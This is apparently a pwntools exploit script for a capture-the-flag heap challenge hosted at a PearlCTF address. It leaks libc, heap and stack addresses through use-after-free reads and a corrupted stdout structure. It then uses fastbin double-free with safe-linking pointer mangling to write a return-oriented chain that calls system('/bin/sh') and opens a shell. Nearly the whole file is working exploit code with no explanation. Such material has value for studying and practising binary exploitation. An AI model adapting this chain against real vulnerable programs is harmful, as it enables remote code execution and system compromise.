#!/usr/bin/python3

from pwn import *

exe = ELF('heap_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x1464

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('dyn.ctf.pearlctf.in', 30010)
else:
        p = process(exe.path)

def create(idx, size, payload):
        sla(b'> ', '1')
        sla(b'> ', str(idx))
        sla(b'> ', str(size))
        sla(b'> ', payload)
def delete(idx):
        sla(b'> ', '2')
        sla(b'> ', str(idx))
def view(idx):
        sla(b'> ', '3')
        sla(b'> ', str(idx))
for i in range(8):
        create(i,0x1f0, b'wan')
create(8,0x80, b'wan')
create(9,0x80, b'wan')
create(10,0x80, b'wan')

for i in range(8):
        delete(i)
view(7)
libc.address = u64(p.recvline(keepends=False)+ b'\0\0') - 0x21ace0 + 0x1000
info("libc.address: " + hex(libc.address))
view(0)
heap = u64(p.recvline(keepends=False).ljust(8, b'\0')) << 12
info("heap: " + hex(heap))

for i in range(7):
        create(i,0x78, b'wan')

create(7,0x78, b'wan')
create(8,0x78, b'wan')
create(9,0x78, b'wan')
for i in range(7):
        delete(i)
delete(7)
delete(8)
delete(7)
target =  libc.sym._IO_2_1_stdout_ ^ (heap +0x15c0)  >> 12
for i in range(7):
        create(i,0x78, b'wan')

create(7,0x78, p64(target))
create(8, 0x78, b'wan')
create(9,0x78, b'wan')
payload=flat(
    0xfbad1800 , #flag
    0xfbad1800 ,0xfbad1800 ,0xfbad1800 , #read_ptr, end, base
    libc.sym['environ'],libc.sym['environ']+8, #write base, ptr
#     p64(libc.sym['_IO_2_1_stdout_'] +131)*2,p64(libc.sym['_IO_2_1_stdout_']+132),
)
create(10, 0x78, payload)
stack = u64(p.recvline(keepends=False).ljust(8, b'\0'))
info("stack: " + hex(stack))

for i in range(7):
        create(i,0x68, b'wan')

create(7,0x68, b'wan')
create(8,0x68, b'wan')
create(9,0x68, b'wan')
for i in range(7):
        delete(i)
delete(7)
delete(8)
delete(7)
target =  (stack-0x140-8) ^ (heap +0x1ac0)  >> 12
for i in range(7):
        create(i,0x68, b'wan')
# GDB()
        
create(7,0x68, p64(target))
create(8, 0x68, b'wan')
create(9,0x68, b'wan')

payload = p64(libc.sym['_IO_2_1_stdout_'])  + p64(libc.address + 0x000000000002a3e5+1) + p64(libc.address + 0x000000000002a3e5) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
# payload = p64(libc.sym._IO_2_1_stdout_) + p64(0xebc88)
create(10,0x68,payload )

p.interactive()
